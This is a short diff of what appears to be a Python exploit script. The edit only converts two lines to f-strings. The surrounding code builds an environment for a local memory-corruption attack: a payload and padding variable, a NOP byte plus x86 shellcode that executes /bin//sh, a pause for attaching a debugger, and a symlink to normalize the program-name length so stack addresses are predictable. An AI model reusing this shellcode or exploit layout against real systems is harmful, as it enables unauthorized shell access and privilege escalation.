@@ -15,12 +15,12 @@ a = p.parse_args()
 env = OrderedDict()
 env['a']='a'
 env['b']='b'
-env['c']='XXXX' + a.payload
+env['c'] = f'XXXX{a.payload}'
 env['d']='d' *    a.padding
 env['sc']="\x90" + "1\xc9\xf7\xe9Ph\x2f\x2fshh\x2fbin\xb0\x0b\x89\xe3\xcd\x80"
 
 if a.wait:
-    raw_input("Attach to %s" % getpid())
+    raw_input(f"Attach to {getpid()}")
 
 # Normalize the length of the program name by making a symlink
 temp     = mktemp()
